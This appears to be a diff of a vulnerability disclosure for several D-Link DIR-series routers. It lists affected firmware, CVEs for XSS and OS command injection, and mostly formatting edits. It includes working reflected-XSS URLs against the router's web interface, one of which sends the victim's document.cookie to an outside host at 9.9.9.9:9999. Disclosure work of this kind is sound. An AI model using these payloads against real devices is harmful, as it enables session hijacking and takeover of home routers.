@@ -12,8 +12,11 @@ Devices: DIR-880 REVA / DIR-868 REVA / DIR-865 / DIR-860 REVA
 Firmware:
 
 DIR-880L_REVA_FIRMWARE_PATCH_1.08B04
+
 DIR868LA1_FW112b04
+
 DIR-865L_REVA_FIRMWARE_PATCH_1.08.B01
+
 DIR860LA1_FW110b04
 
 ## 0x01 Vulnerabilities Summary
@@ -21,11 +24,11 @@ The Dlink 860L/865L/868L/880L is a router overall badly designed with a lot of v
 
 My research in analyzing the security of Dlink routers starts from a recent security contest organized by a security company.
 
-##0x02 The summary of the vulnerabilities is:
+## 0x02 The summary of the vulnerabilities is:
 1. WAN && LAN - revA/B - XSS - CVE-2018-6527, CVE-2018-6528, CVE-2018-6529
 2. LAN - revA/B - OS command injection - CVE-2018-6530
 
-##0x03 Details - WAN && LAN - revA/B - XSS
+## 0x03 Details - WAN && LAN - revA/B - XSS
 
 After analyzing PHP files inside /htdocs/webinc, I found several trivial XSS vulnerabilities.
 
@@ -71,7 +74,7 @@ http://192.168.0.1/adv_parent_ctrl_map.php?deviceid=whatever\');window.open(\'ht
 An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
 http://192.168.0.1/bsc_sms_inbox.php?Treturn=0';window.open('http://9.9.9.9:9999/cookie.asp?msg='+document.cookie);get_Treturn='1
 
-3. Command injection in SOAP controlType url interface
+## 0x04 Details - LAN - revA/B - Command injection in SOAP controlType url interface
 
 The vulnerability occurs in /htdocs/cgibin which is executed by the web server for, just handles almost http requests from WAN and LAN, and my research in analyzing SOAP interface started from a security analysis report regarding UPNP protocol, then I reviewed the SOAP interface, which is handled by the soapcgi_main function in cgibin, seems to have been mostly overlooked.
 
